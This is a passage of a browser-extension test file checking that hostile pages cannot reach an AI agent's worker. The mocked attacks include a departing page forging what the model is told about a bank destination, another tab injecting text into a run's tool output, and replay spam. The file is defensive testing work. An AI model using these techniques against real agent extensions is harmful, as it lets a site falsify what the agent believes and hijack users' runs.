        assert.deepEqual([bg.localStore.ml_site_agents, bg.localStore.ml_site_selfapprove], [local.ml_site_agents, local.ml_site_selfapprove], `${type} ${JSON.stringify(edit)}`);
        assert.equal(bg.sessionStore.ml_site_agents, undefined, `${type} ${JSON.stringify(edit)}: the session half`);
    }
    // Positive control: the extension's own Settings page writes both.
    const bg = loadBackground({ config: baseConfig(), siteGate: true, siteAgents: null, local: structuredClone(local) });
    const settings = { url: "chrome-extension://test/sidebar.html" };
    await bg.send({ type: "SITE_ACCESS", payload: { edit: edits[1] } }, settings);
    await bg.send({ type: "SITE_ACCESS", payload: { edit: edits[2] } }, settings);
    assert.deepEqual(bg.localStore.ml_site_agents, { "https://victim.example": "denied" });
    assert.deepEqual(bg.localStore.ml_site_selfapprove, ["https://evil.example", "https://friend.example"]);
});

test("GAIN blocked — the streaming port is the same model call: refused from an unapproved origin", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
    const port = bg.connect("LLM_STREAM", hostilePage());
    port.send({ payload: { messages: [{ role: "user", content: "hi" }] } });
    await tick();
    assert.match(port.messages.find((m) => m.type === "error")?.error || "", /not approved/);
    assert.equal(bg.calls.length, 0);
});

test("GAIN blocked — a page's cancel is its own message type, so the gate can refuse it without refusing the person's Stop", async () => {
    const relayed = await pageRelays({ type: "CANCEL_RUN_REQUEST", payload: { runId: "r" } });
    assert.deepEqual(relayed, ["PAGE_CANCEL_RUN"]);
    assert.ok(RUN_CONTROL_TYPES.has("PAGE_CANCEL_RUN"), "and it is run control: never allowed from an unapproved page");
});

test("GAIN blocked — the worker's question to the shell about where the extension's UI is (SHOT_RECTS) is no page's to send, relay or read", async () => {
    // worker-vision.ts `workerShot` asks the shell (chrome.tabs.sendMessage → the content script) for the rects to mask
    // out of its capture, and the shell answers the worker only (shell-shot.ts). The type must not be one a page can get
    // relayed, or a page could learn when the worker shoots, or have the worker ask on its behalf. SHOT_HIDE/SHOT_SHOW,
    // the hide this replaced, are gone, and stay unrelayable.
    const shotTypes = ["SHOT_RECTS", "SHOT_HIDE", "SHOT_SHOW"];
    const mapped = Object.entries(HANDLE_MAP).flatMap(([k, v]) => [k, v.type, v.responseType]);
    for (const t of shotTypes) {
        assert.ok(!mapped.some((m) => String(m).startsWith(t)), `${t} is in HANDLE_MAP`);
        assert.ok(!PAGE_STARTED_TYPES.has(t), `${t} is page-startable`);
    }
    const relayed = await pageRelays(...shotTypes.flatMap((t) => [{ type: t }, { type: `${t}_REQUEST`, payload: {} }]));
    assert.deepEqual(relayed, [], "the content script relays none of them");
    // Sent straight at the worker as if relayed, it does nothing: no message to any tab's shell.
    const bg = loadBackground({ config: baseConfig() });
    // (an unknown type is never answered, as Chrome closes such a channel; the race stands in for that)
    for (const t of shotTypes) await Promise.race([bg.send({ type: t }, hostilePage()), tick()]);
    assert.deepEqual(bg.tabMessages.filter((a) => /^SHOT_/.test(a[1]?.type)), [], "the worker forwarded a page's SHOT_* to a shell");
    // And the worker's own SHOT_RECTS reaching the content script is never re-posted on the page's window.
    const world = loadPageWorld({ onRuntimeMessage: () => ({ data: null }) });
    const posted = [];
    const real = world.context.window.postMessage;
    world.context.window.postMessage = (m, ...rest) => { posted.push(m); return real.call(world.context.window, m, ...rest); };
    await tick();
    world.fromContent((e) => posted.push(e.data));   // the port too: a page may hold it
    for (const t of shotTypes) await world.fireRuntimeMessage({ type: t }, { id: "ext" });
    await tick();
    assert.deepEqual(posted.filter((m) => JSON.stringify(m).includes("SHOT")), [], "the page saw the worker's shot");
});

test("the extension's own shell sends nothing the origin gate refuses (it shares the page's sender)", async () => {
    // The browser reports the content-script shell's messages as coming from the page, so a type it sends that is also
    // page-startable is refused on every unapproved site: the Commander's Pyodide prewarm was. Only the page's own debug
    // and session events are forwarded under a gated type, on purpose (an unapproved page has none worth keeping).
    const src = require("node:fs").readFileSync(require("node:path").join(__dirname, "../src/sidebar/shell.ts"), "utf8");
    const sent = [...src.matchAll(/sendMessage\(\{\s*type:\s*"([A-Z_]+)"/g)].map((m) => m[1]);
    assert.ok(sent.length >= 5, `found ${sent.length} sends: the scan is reading the file`);
    const gated = sent.filter((t) => PAGE_STARTED_TYPES.has(t) && t !== "ML_DEBUG_EVENT" && t !== "ML_SESSION_EVENT");
    assert.deepEqual([...new Set(gated)], [], "a shell message would be refused on an unapproved site");
    // And the prewarm it does send gets through from an unapproved tab.
    const bg = loadBackground({ config: baseConfig(), siteGate: true });
    const res = await bg.send({ type: "USER_PYTHON_PREWARM", payload: { trigger: "commander" } }, hostilePage());
    assert.doesNotMatch(res?.error || "", /Refused/);
});

test("an approval that comes from the self-approval list says so, and a Revoke of it takes the self-approval away", async () => {
    const bg = loadBackground({ config: baseConfig({ pageApprovalDomains: ["trusted.example"] }), siteGate: true });
    const surface = { url: "chrome-extension://test/popup.html" };
    const implied = await bg.send({ type: "SITE_ACCESS", payload: { origin: "https://trusted.example" } }, surface);
    assert.equal(implied.data.decision, "always");
    assert.equal(implied.data.implied, true);
    await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "allow", origin: "https://listed.example", scope: "always" } } }, surface);
    const listed = await bg.send({ type: "SITE_ACCESS", payload: { origin: "https://listed.example" } }, surface);
    assert.equal(listed.data.implied, undefined, "an approval on the list is the list's to revoke");
    const revoked = await bg.send({ type: "SITE_ACCESS", payload: { origin: "https://trusted.example", edit: { op: "revoke", origin: "https://trusted.example" } } }, surface);
    assert.equal(revoked.data.decision, "unknown", "revoked, not still allowed by self-approval");
    assert.equal(revoked.data.levels.selfApprove, false);
});

// ── UNGATED: what the content script sends OUTSIDE PAGE_STARTED_TYPES, on a page's word ─────────────────────────
// The origin gate (sw-site-access.ts) passes any type that is not in PAGE_STARTED_TYPES. The content script sends four
// more, each triggered by a window message the page can post: those handlers must check the sender themselves, and
// nothing enumerates them. The OPEN tests below are attacks that work on main: each is a `todo` asserting the defended
// behaviour, so it reports its failure without failing the suite, and loses the `todo` when the defence lands.

test("the content script's ungated sends are exactly the reviewed list, each bound to the sender by its handler", () => {
    const src = require("node:fs").readFileSync(require("node:path").join(__dirname, "../src/content.ts"), "utf8");
    const sent = new Set([...src.matchAll(/sendMessage\(\{\s*type:\s*"([A-Z_]+)"/g)].map((m) => m[1]));
    assert.ok(sent.size >= 5, `found ${sent.size} sends: the scan is reading the file`);
    const ungated = [...sent].filter((t) => !PAGE_STARTED_TYPES.has(t)).sort();
    // A new entry here is a new way for any page, approved or not, to reach the worker: add it only with a test that a
    // page cannot use it for a run it does not host, or move it under the gate (page-relay.ts PAGE_RELAYED_EXTRA).
    assert.deepEqual(ungated, [
        "CONTENT_READY",      // answers with the rebuild of runs on the SENDER's tab; triggers resume + history replay
        "PAGE_TOOL_STREAM",   // NO sender check: see the OPEN test below
        "RUN_READOPTED",      // keyed by the sender's tab, not its document: see the OPEN test below
        "VALUE_COLUMNS",      // a worker-hosted run's in-flight call, for a key sent with it (named-reads.ts)
    ]);
});

test("the page a run navigates AWAY from cannot write what the model is told about the destination", async () => {
    // `navigate` defers the location change a tick and its result returns while the OLD document is still alive. The
    // worker then waits on the nav barrier for RUN_READOPTED, which any document on the tab can send (window message
    // RUN_READOPTED → content.ts → ungated). The departing page (an unapproved site the run was visiting) races the
    // destination: its pageInfo is folded into the navigate result as "You are now on the new page", so site A writes
    // what the model believes about site B (a bank, a login page), and the barrier opens before B's tools exist.
    // Same race on the channel-closed path (sw-run-host.ts, `CHANNEL_GONE`). Fix shape: accept a re-adopt only from a
    // document other than the one the navigation left (`sender.documentId`), or only after the tab committed.
    let turn2 = null, fetches = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "navigate", arguments: JSON.stringify({ url: "https://bank.example/" }) } }] }, finish_reason: "tool_calls" }] });
            turn2 = call.body.messages;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type !== "RUN_TOOL_IN_PAGE" || msg.payload?.name !== "navigate") return undefined;
            // The departing document answers first (it saw PAGE_TOOL_RUN, and its runId); the destination commits and
            // re-adopts a moment later, as a real tab reports it (webNavigation.onCommitted, then the new document).
            setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navx", pageInfo: "URL: https://bank.example/\nTitle: FORGED by evil.example" } }, { ...hostilePage(6), documentId: "doc-evil" }); }, 0);
            setTimeout(() => { bg.commit(6, { documentId: "doc-bank", url: "https://bank.example/" }); }, 30);
            setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navx", pageInfo: "URL: https://bank.example/\nTitle: Real Bank" } }, { tab: { id: 6, url: "https://bank.example/" }, url: "https://bank.example/", documentId: "doc-bank" }); }, 40);
            return { result: "Navigating to https://bank.example/ … wait for the new page, then continue." };
        },
    });
    bg.commit(6, { documentId: "doc-evil", url: "https://evil.example/" });
    await bg.send({ type: "START_RUN", payload: {
        runId: "navx", task: "go to the bank", systemPrompt: "sys",
        tools: [{ name: "navigate", description: "go", parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { ...hostilePage(6), documentId: "doc-evil" });
    const joined = (turn2 || []).map((m) => (typeof m.content === "string" ? m.content : "")).join("\n");
    assert.match(joined, /You are now on the new page/, "positive control: orient-on-nav ran");
    assert.doesNotMatch(joined, /FORGED by evil\.example/, "the departing page's pageInfo reached the model as the destination's");
    assert.match(joined, /Real Bank/, "the destination's own pageInfo is what the model reads");
});

/** A run on tab 6 calls `navigate` (or a tool whose channel closes mid-call, `gone`); `during(bg)` plays the browser and
 *  the two documents while the call is out. Returns what the model read on its next turn. */
async function navRace(during, { gone = false } = {}) {
    let turn2 = null, fetches = 0, bg;
    const tool = gone ? "click" : "navigate";
    bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: tool, arguments: JSON.stringify({ url: "https://bank.example/" }) } }] }, finish_reason: "tool_calls" }] });
            turn2 = call.body.messages;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) void bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });   // the gate a privileged builtin always gets
            if (msg?.type !== "RUN_TOOL_IN_PAGE" || msg.payload?.name !== tool || msg.payload.renderOnly || msg.payload.precheck) return undefined;
            await during(bg);
            if (gone) throw new Error("A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received");
            return { result: "Navigating to https://bank.example/ … wait for the new page, then continue." };
        },
    });
    bg.commit(6, { documentId: "doc-evil", url: "https://evil.example/" });
    await bg.send({ type: "START_RUN", payload: {
        runId: "navy", task: "go to the bank", systemPrompt: "sys",
        tools: [{ name: tool, description: "go", parameters: { type: "object", properties: { url: { type: "string" } } }, requiresApproval: true, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { ...hostilePage(6), documentId: "doc-evil" });
    return (turn2 || []).map((m) => (typeof m.content === "string" ? m.content : "")).join("\n");
}
const readopt = (bg, doc, title, at) => setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navy", pageInfo: `URL: https://bank.example/\nTitle: ${title}` } }, { tab: { id: 6, url: "https://bank.example/" }, url: "https://bank.example/", documentId: doc }); }, at);

test("a document the tab has already left cannot re-adopt after the destination committed", async () => {
    const joined = await navRace(async (bg) => {
        setTimeout(() => bg.commit(6, { documentId: "doc-bank", url: "https://bank.example/" }), 5);
        readopt(bg, "doc-evil", "FORGED by a stale document", 15);
        readopt(bg, "doc-bank", "Real Bank", 40);
    });
    assert.doesNotMatch(joined, /FORGED/);
    assert.match(joined, /You are now on the new page:[\s\S]*Real Bank/);
});

test("a call whose channel closes mid-navigation: the departing page's re-adopt is refused, the destination's fast one kept", async () => {
    const joined = await navRace(async (bg) => {
        // Both before the channel-closed error reaches the worker: the old page first, then the browser's commit and the
        // new page, which "beat us" to it.
        readopt(bg, "doc-evil", "FORGED by evil.example", 0);
        setTimeout(() => bg.commit(6, { documentId: "doc-bank", url: "https://bank.example/" }), 5);
        readopt(bg, "doc-bank", "Real Bank", 10);
        await new Promise((r) => setTimeout(r, 30));
    }, { gone: true });
    assert.match(joined, /The page navigated while running "click"/, "positive control: the channel-closed path ran");
    assert.doesNotMatch(joined, /FORGED/);
    assert.match(joined, /Real Bank/, "the destination's own pageInfo, which arrived before the error did");
});

test("a page on ANOTHER tab cannot write into a run's live tool output", async () => {
    // delegateStreams is keyed by runId and the PAGE_TOOL_STREAM handler never compares the sender's tab with the run's
    // (VALUE_COLUMNS and DEREF_TOKEN do). Any tab that knows a run id (its own page-hosted run handed to the worker, a
    // hash leaked by a session message) writes lines into another tab's run while one of its tools streams: they reach
    // every surface as that tool's output. Fix shape: the run's tab (and frame 0) or nothing, like VALUE_COLUMNS.
    const bg = loadBackground({
        config: baseConfig(),
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type !== "RUN_TOOL_IN_PAGE" || msg.payload?.name !== "exec" || msg.payload.renderOnly || msg.payload.precheck || msg.payload.readonlyTry) return undefined;
            void bg.send({ type: "PAGE_TOOL_STREAM", runId: "victim", chunk: "real line\n" }, { tab: { id: 7, url: "https://ok.example/" }, url: "https://ok.example/" });
            await new Promise((r) => setTimeout(r, 120));   // past the fan's 90 ms throttle, so each chunk is its own emit
            void bg.send({ type: "PAGE_TOOL_STREAM", runId: "victim", chunk: "INJECTED from tab 9\n" }, hostilePage(9));   // another tab, another site
            await new Promise((r) => setTimeout(r, 120));
            return { result: "console:\nreal line" };
        },
        onFetch: (() => { let n = 0; return () => ++n === 1
            ? streamResponse([
                'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"exec","arguments":"{\\"js\\":\\"x\\"}"}}]}}]}\n',
                'data: {"choices":[{"delta":{},"finish_reason":"tool_calls"}]}\n', "data: [DONE]\n",
            ])
            : streamResponse(['data: {"choices":[{"delta":{"content":"done"}}]}\n', "data: [DONE]\n"]); })(),
    });
    const panel = bg.connect("ml-devtools");
    // exec always asks (a page cannot send it requiresApproval: false); the panel approves it.
    panel.onMessage((m) => { const e = m.__mlDebug; if (e?.awaitingApproval) void bg.send({ type: "SET_APPROVAL", payload: { runId: e.id, seq: e.seq, decision: true } }); });
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    await bg.send({ type: "START_RUN", payload: {
        runId: "victim", task: "t", systemPrompt: "s",
        tools: [{ name: "exec", requiresApproval: true, description: "", parameters: { type: "object", properties: { js: { type: "string" } } }, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools", stream: true,
    } }, { tab: { id: 7, url: "https://ok.example/" }, url: "https://ok.example/" });
    await new Promise((r) => setTimeout(r, 150));   // past the fan's trailing emit
    const outs = panel.messages.map((m) => m.__mlDebug).filter((e) => e?.kind === "agent-step" && e.streamOutput != null).map((e) => e.streamOutput);
    assert.ok(outs.some((o) => /real line/.test(o)), `positive control: the run's own tab streams (got ${JSON.stringify(outs)})`);
    assert.ok(outs.every((o) => !/INJECTED/.test(o)), `a line from another tab reached the run's live output: ${JSON.stringify(outs)}`);
});

test("what a page's CONTENT_READY is answered with: the rebuild's fields are the reviewed list", async () => {
    // Any document on a tab hosting a run gets the run's rebuild (it must register the run's tools), approved or not.
    // Pinned so a field added to RebuildConfig, a credential or a pointer say, is a decision rather than a leak.
    let release;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "look", arguments: "{}" } }] }, finish_reason: "tool_calls" }] }),
        onTabMessage: async (_t, msg) => { if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "look" && !msg.payload.renderOnly) await new Promise((r) => { release = r; }); return msg?.type === "RUN_TOOL_IN_PAGE" ? { result: "ok" } : undefined; } });
    const rebuild = { toolNames: ["look"], model: "m", driverSees: false, visionModel: "v", groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: false };
    void bg.send({ type: "START_RUN", payload: { runId: "cr", task: "t", systemPrompt: "s", rebuild,
        tools: [{ name: "look", requiresApproval: false, description: "", parameters: { type: "object", properties: {} }, capabilities: [] }],
        model: "m", think: null, maxSteps: 2, autoApprovePython: false, autoApproveReadonly: false, surface: "off" } }, { ...hostilePage(9), documentId: "doc-1" });
    for (let i = 0; i < 20 && !release; i++) await tick();
    assert.ok(release, "the run is mid-tool on tab 9");
    const res = await bg.send({ type: "CONTENT_READY" }, { ...hostilePage(9), documentId: "doc-1" });
    assert.equal(res.adopt?.length, 1, "the page is handed the run on its tab");
    assert.deepEqual(Object.keys(res.adopt[0]).sort(), ["rebuild", "runId"]);
    assert.deepEqual(Object.keys(res.adopt[0].rebuild).sort(), ["cdp", "crossOrigin", "driverSees", "groundingModel", "groundingRange", "model", "pierceClosed", "toolNames", "visionModel"]);
    release();
});

test("a page cannot make the worker replay a run's history to its tab again and again", async () => {
    // CONTENT_READY means "a fresh document loaded", but the worker takes the page's word for it: one document that
    // posts PAGE_ADOPT_HELLO three times gets the run's whole history pushed to its shell three times. The card's
    // reducer then repeats every step with no seq (tests/reducer-batch.test.mjs), and each burst snaps the card's size
    // back. Fix shape: replay once per `sender.documentId`.
    let release;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: "thinking first", tool_calls: [{ id: "c1", type: "function", function: { name: "look", arguments: "{}" } }] }, finish_reason: "tool_calls" }] }),
        onTabMessage: async (_t, msg) => { if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "look" && !msg.payload.renderOnly) await new Promise((r) => { release = r; }); return msg?.type === "RUN_TOOL_IN_PAGE" ? { result: "ok" } : undefined; } });
    const rebuild = { toolNames: ["look"], model: "m", driverSees: false, visionModel: null, groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: false };
    void bg.send({ type: "START_RUN", payload: { runId: "spam", task: "t", systemPrompt: "s", rebuild,
        tools: [{ name: "look", requiresApproval: false, description: "", parameters: { type: "object", properties: {} }, capabilities: [] }],
        model: "m", think: null, maxSteps: 2, autoApprovePython: false, autoApproveReadonly: false, surface: "off" } }, { ...hostilePage(9), documentId: "doc-1" });
    for (let i = 0; i < 20 && !release; i++) await tick();
    const replays = () => bg.tabMessages.filter(([tabId, m]) => tabId === 9 && m?.type === "ML_DEBUG_TO_PAGE").length;
    const sender = { ...hostilePage(9), documentId: "doc-1" };
    // The replay now waits for the shell to say it is listening (SHELL_LISTENING), since the content script answers
    // CONTENT_READY at document_start; both are sent again here, as a page that reloads its scripts would make them.
    await bg.send({ type: "CONTENT_READY" }, sender); void bg.send({ type: "SHELL_LISTENING" }, sender); await tick();
    const first = replays();
    for (let i = 0; i < 2; i++) { await bg.send({ type: "CONTENT_READY" }, sender); void bg.send({ type: "SHELL_LISTENING" }, sender); await tick(); }
    release();
    assert.ok(first > 0, "positive control: the run's history was buffered and the tab gets ML_DEBUG_TO_PAGE");
    assert.equal(replays(), first, `the same document got the history again: ${first} events after one ask, ${replays()} after three`);
});

// ── (g) PART 5: no page-started type for a page a run is on (docs/spec/SITE_ACCESS.md slice 2 part 5) ─────────────
// Until part 5, a tab HOSTING a run could send what the run's tools sent from the page (`RUN_TAB_TYPES`), whatever its
// origin. Part 5 moved the last of those tools to the worker and dropped the allowance: an unapproved page a run is on
// gets exactly what any unapproved page gets. The types it used to get, by name, so this list is not read from the code
// that removed them.
const FORMER_RUN_TAB_TYPES = [
    "FETCH_LLM", "ABORT_TASK", "MODEL_CAPS", "GET_MODEL", "GET_CONFIG",
    "CAPTURE_TAB", "FETCH_IMAGE_B64", "FETCH_URL", "PYTHON_EXEC", "FETCH_SHEET",
    "LIST_SERVER_TOOLS", "SERVER_TOOL_EXEC", "CDP_SHADOW_RESOLVE",
];

/** `bg.send`, raced against a bound: a type let through to a handler that never answers must fail the test, not hang it. */
const sendBounded = (bg, msg, sender, ms = 3000) => Promise.race([bg.send(msg, sender), new Promise((r) => setTimeout(() => r({ timeout: true }), ms))]);

/** A message of `type` carrying everything a page knows about the run: its id, as a run id, a session hint and a
 *  request id, with a payload each handler would act on. */
const knowingMessage = (type, runId) => ({
    type, requestId: `wml-${runId}`,
    payload: {
        runId, hint: { use: "agent", session: `wml-${runId}` }, messages: [{ role: "user", content: "EVIL FROM THE RUN'S PAGE" }],
        url: "https://docs.google.com/spreadsheets/d/abc/export?format=csv", selector: "x >>> y", code: "print('EVIL')", hardened: false,
        toolId: "tool", name: "fn", args: {}, model: "default-model",
    },
});

// --- part 5: a page a run is on is lent nothing ---

test("PART 5 — a tab hosting a run gets nothing an unapproved page would not: every page-started type is refused, the former run-tab types included", async () => {
    for (const type of FORMER_RUN_TAB_TYPES) assert.ok(PAGE_STARTED_TYPES.has(type), `${type} is a page-started type (a typo would test nothing)`);
    for (const type of PAGE_STARTED_TYPES) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
        bg.context.__mlSeedActiveRunForTest(9, "run-on-tab");
        const { res, fetched, toTabs, captured } = await attempt(bg, type, hostilePage());
        assert.match(res?.error || "", /^Refused: https:\/\/evil\.example is not approved/, `${type}: refused on a tab hosting a run`);
        assert.deepEqual({ fetched, toTabs, captured }, { fetched: 0, toTabs: 0, captured: 0 }, `${type}: nothing reached the backend, a tab or the screen`);
    }
    // The positive control: the same tab's page, on an approved origin, is let through (the gate is what refused).
    const ok = loadBackground({ config: baseConfig(), siteGate: true, local: { ml_site_always: ["https://evil.example"] }, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    ok.context.__mlSeedActiveRunForTest(9, "run-on-tab");
    assert.equal((await ok.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, hostilePage())).data, "ok");
});

test("PART 5 — an unapproved page that knows the run's id gets nothing from a former run-tab type while the run is live on it, in the middle of its own tool call", async () => {
    const SITE = { id: 9, windowId: 1, active: true, url: "https://evil.example/attack", title: "Evil" };
    const answers = {};
    let sawCall = false, attempted = null;
    const bg = loadBackground({
        config: baseConfig({ cdp: true }), siteGate: true, openTabs: [SITE],
        onFetch: (call) => {
            if (!call.url.includes("/chat/completions")) return jsonResponse({});
            const driver = bg.calls.filter((c) => c.url.includes("/chat/completions") && c.body?.tools?.length).length;
            return jsonResponse(driver === 1
                ? { choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "findByText", arguments: JSON.stringify({ text: "code" }) } }] } }] }
                : { choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_t, msg) => {
            if (msg.type === "ADOPT_RUN_NOW") return { pageInfo: "" };
            if (msg.type !== "RUN_TOOL_IN_PAGE") return undefined;
            const p = msg.payload;
            if (p.finish || p.renderOnly || p.precheck || p.readonlyTry || p.geometry) return { result: "" };
            // The run's own call is in the page: the page uses the moment, naming the run in every way it can.
            sawCall = true;
            const before = { fetched: bg.calls.length, captured: bg.captures.length };
            for (const type of FORMER_RUN_TAB_TYPES) answers[type] = await sendBounded(bg, knowingMessage(type, p.runId), { tab: { id: 9, url: SITE.url }, url: SITE.url, origin: "https://evil.example", frameId: 0, documentId: "doc-9" });
            await tick();
            attempted = { fetched: bg.calls.length - before.fetched, captured: bg.captures.length - before.captured };
            return { result: "found: code 4417" };
        },
    });
    const { hash } = await bg.context.__mlStartUserRunForTest(9, { task: "what is the code?", surface: "hud" });
    for (let i = 0; i < 500 && !bg.calls.some((c) => c.body?.tools?.length && JSON.stringify(c.body.messages).includes("4417")); i++) await tick();
    assert.ok(sawCall, "positive control: the run's own tool call reached the page, so the run was live on it");
    assert.ok(hash, "the run started");
    for (const type of FORMER_RUN_TAB_TYPES) assert.match(answers[type]?.error || "", /^Refused: https:\/\/evil\.example is not approved/, `${type}: ${JSON.stringify(answers[type])}`);
    assert.deepEqual(attempted, { fetched: 0, captured: 0 }, "nothing the page sent reached the backend or the screen");
    assert.ok(!JSON.stringify(bg.calls).includes("EVIL FROM THE RUN'S PAGE"));
});

// --- part 5: the hand-over on navigation, which the destination cannot stop ---

/**
 * A page-built run on tab 7, built by an approved page (builder.example), whose driver navigates to `dest` and then
 * calls `look`. `onDestination(bg, ctx)` plays the destination's page from the commit on; `readopt` sends the
 * destination's own CONTENT_READY and RUN_READOPTED afterwards. Returns what reached the page and the run's log.
 */
async function navigatedRun(dest, { onDestination = async () => {}, readopt = true } = {}) {
    const A = "https://builder.example/start";
    const tab = { id: 7, windowId: 1, active: true, url: A, title: "Builder" };
    let bg, driver = 0;
    const calls = [{ name: "navigate", args: { url: dest } }, { name: "look", args: { question: "Q-SECRET what is shown" } }];
    const destSender = (extra = {}) => ({ tab: { id: 7, url: dest }, url: dest, origin: new URL(dest).origin, frameId: 0, documentId: "doc-dest", ...extra });
    const go = async () => {
        tab.url = dest;
        bg.commit(7, { documentId: "doc-dest", url: dest });
        await onDestination(bg, { destSender, builderSender: { tab: { id: 7, url: A }, url: A, origin: "https://builder.example", frameId: 0, documentId: "doc-builder" } });
        if (!readopt) return;
        await bg.send({ type: "CONTENT_READY" }, destSender());
        await bg.send({ type: "RUN_READOPTED", payload: { runId: "nav-run", pageInfo: "the destination" } }, destSender());
    };
    bg = loadBackground({
        config: baseConfig({ model: "text-driver", ocrModel: "reader-vl" }), siteGate: true, local: { ml_site_always: ["https://builder.example"] }, openTabs: [tab],
        onCaptureTab: async () => "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
        onFetch: (call) => {
            if (call.url.endsWith("/api/models")) return jsonResponse({ data: [{ id: "text-driver" }, { id: "reader-vl" }] });
            if (call.url.endsWith("/api/show")) return call.body?.model === "reader-vl" ? jsonResponse({ capabilities: ["completion", "vision"], model_info: {} }) : jsonResponse({ capabilities: ["completion", "tools"], model_info: {} });
            if (!call.url.includes("/chat/completions")) return jsonResponse({});
            if (!call.body?.tools?.length) return jsonResponse({ choices: [{ message: { content: "the reader's words" } }] });
            const next = calls[driver++];
            return jsonResponse(next ? { choices: [{ message: { content: null, tool_calls: [{ id: `c${driver}`, type: "function", function: { name: next.name, arguments: JSON.stringify(next.args) } }] } }] } : { choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_t, msg) => {
            if (msg.type === "SHOT_RECTS") return { vw: 1024, vh: 768, rects: [] };
            if (msg.type !== "RUN_TOOL_IN_PAGE") return undefined;
            const p = msg.payload;
            if (p.geometry) return { result: "", geometry: { seq: p.geometry.seq, reply: p.geometry.op === "view" ? { w: 1024, h: 768, dpr: 1, sx: 0, sy: 0 } : p.geometry.op === "legend" ? { controls: [], media: [], boundaries: [], text: [], moreControls: 0, moreMedia: 0 } : null } };
            if (p.finish || p.renderOnly || p.precheck || p.readonlyTry) return { result: "" };
            if (p.name === "navigate") { setTimeout(() => void go(), 5); return { result: `Navigating to ${dest}` }; }
            return { result: `the page's own ${p.name}: Q-SECRET seen` };
        },
    });
    const tool = (name) => ({ name, description: name, parameters: { type: "object", properties: {} }, requiresApproval: false, capabilities: name === "look" ? ["vision"] : [] });
    void bg.send({ type: "START_RUN", payload: { runId: "nav-run", task: "go", systemPrompt: "sys", tools: ["navigate", "look"].map(tool), model: "text-driver", think: null, maxSteps: 10, surface: "off", crossOrigin: true, approvalRouting: "both",
        rebuild: { toolNames: ["navigate", "look"], model: "text-driver", driverSees: false, visionModel: "reader-vl", groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: true } } },
        { tab: { id: 7, url: A }, url: A, origin: "https://builder.example", frameId: 0, documentId: "doc-builder" });
    for (let i = 0; i < 3000 && driver <= calls.length; i++) {
        for (const g of bg.context.__mlApprovals.list()) bg.context.__mlApprovals.resolve(g.key, true);
        await new Promise((r) => setTimeout(r, 2));
    }
    await new Promise((r) => setTimeout(r, 30));
    const pageCalls = bg.tabMessages.filter(([, m]) => m.type === "RUN_TOOL_IN_PAGE").map(([, m]) => JSON.parse(JSON.stringify(m.payload)));
    const log = (await bg.context.__mlRunLog.all()).filter((r) => r.run === "nav-run").map((r) => JSON.parse(JSON.stringify(r)));
    const lastDriver = bg.calls.filter((c) => c.body?.tools?.length).at(-1);
    return { bg, driver, pageCalls, log, seen: JSON.stringify(lastDriver?.body?.messages ?? []) };
}

test("PART 5 — the unapproved page a page-built run navigates onto cannot stop the hand-over: run control, a reclaiming START_RUN and the departing page's re-adopt all leave it the worker's", async () => {
    const tried = {};
    const w = await navigatedRun("https://evil.example/landing", {
        onDestination: async (bg, { destSender, builderSender }) => {
            // The document being left races the destination with a re-adopt from the approved builder's URL.
            await bg.send({ type: "CONTENT_READY" }, builderSender);
            // The destination knows the run's id (its debug events carry it) and tries every way to keep or end it.
            tried.cancel = await sendBounded(bg, { type: "PAGE_CANCEL_RUN", payload: { runId: "nav-run" } }, destSender());
            tried.resume = await sendBounded(bg, { type: "RESUME_RUN", payload: { runId: "nav-run", task: "EVIL TURN" } }, destSender());
